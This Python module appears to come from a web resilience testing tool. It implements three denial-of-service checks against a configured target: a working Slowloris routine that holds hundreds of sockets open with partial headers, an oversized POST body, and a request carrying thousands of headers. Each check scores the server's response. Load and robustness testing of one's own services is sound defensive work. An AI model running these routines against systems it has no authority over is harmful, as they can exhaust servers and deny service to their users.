from typing import Any, Dict
import socket
import time
import threading
import random
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_slowloris(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Slowloris DoS
    Opens many connections and sends partial headers periodically to keep them open.
    Exhausts server thread/connection pool.
    """
    target_ip = "127.0.0.1" # Default, parsed from base_url usually
    port = 80
    
    # Primitives to parse URL from client (hacky but works for MVP)
    from urllib.parse import urlparse
    parsed = urlparse(client.base_url)
    target_ip = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    
    socket_count = int(scenario.config.get("sockets", 200))
    sockets = []
    
    issues = []
    
    # 1. Create Sockets
    for _ in range(socket_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, port))
            
            # Send initial headers (partial)
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"User-Agent: Slowloris\r\n".encode("utf-8"))
            s.send(f"Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
            sockets.append(s)
        except:
            break
            
    # 2. Keep them alive
    # We will try to hold them for X seconds (e.g. 10s simulation)
    # real attack holds forever.
    
    start_time = time.time()
    try:
        while time.time() - start_time < 10:
            if len(sockets) == 0:
                break
            
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except:
                    sockets.remove(s)
                    
            time.sleep(0.5)
            
    except Exception:
        pass
        
    # 3. Check if server is still responsive
    try:
        # Try a fresh request using normal client
        check_start = time.time()
        resp = client.send("GET", "/")
        if resp.elapsed_ms > 3000:
             issues.append(f"Server Slowed Down significantly ({resp.elapsed_ms}ms) during Slowloris")
        if resp.status_code >= 500:
             issues.append("Server Errored (5xx) during Slowloris")
    except:
        issues.append("Server Completely Unresponsive during Slowloris")
        
    # Cleanup
    for s in sockets:
        try:
            s.close()
        except: pass
        
    return {
        "scenario_id": scenario.id,
        "attack_type": "slowloris",
        "passed": len(issues) == 0,
        "details": {"issues": issues, "sockets_held": len(sockets)}
    }

def run_large_payload(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Body Bomb (Large Payload DoS)
    Sends a 50MB-100MB POST body.
    """
    size_mb = int(scenario.config.get("size_mb", 10))
    payload = "A" * (size_mb * 1024 * 1024)
    
    issues = []
    try:
        # Expecting 413 Payload Too Large is GOOD.
        # 500 or Timeout or Crash is BAD.
        
        resp = client.send(scenario.method, scenario.target, form_body=payload)
        
        if resp.status_code == 413:
            pass # Good handled
        elif resp.status_code >= 500:
            issues.append(f"Server Crashed (5xx) receiving {size_mb}MB payload")
        elif resp.elapsed_ms > 5000:
            issues.append(f"Server Lagged ({resp.elapsed_ms}ms) processing {size_mb}MB payload")
            
    except Exception as e:
        issues.append(f"Server Connection Died: {e}")

    return {
        "scenario_id": scenario.id,
        "attack_type": "body_bomb",
        "passed": len(issues) == 0,
        "details": {"issues": issues}
    }

def run_header_bomb(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Header Bomb
    Sends thousands of HTTP headers to exhaust stack space or parsing buffers.
    """
    count = int(scenario.config.get("count", 3000))
    headers = {}
    for i in range(count):
        headers[f"X-Custom-Header-{i}"] = "A" * 10
        
    issues = []
    try:
        # requests might struggle sending this many headers, but let's try
        resp = client.send(scenario.method, scenario.target, headers=headers)
        
        if resp.status_code >= 431:
             pass # 431 Request Header Fields Too Large -> Handled Good
        elif resp.status_code >= 500:
             issues.append(f"Server Error (5xx) with {count} headers")
             
    except Exception as e:
         issues.append(f"Server Dropped Connection (Header Overflow): {e}")

    return {
        "scenario_id": scenario.id,
        "attack_type": "header_bomb",
        "passed": len(issues) == 0,
        "details": {"issues": issues}
    }
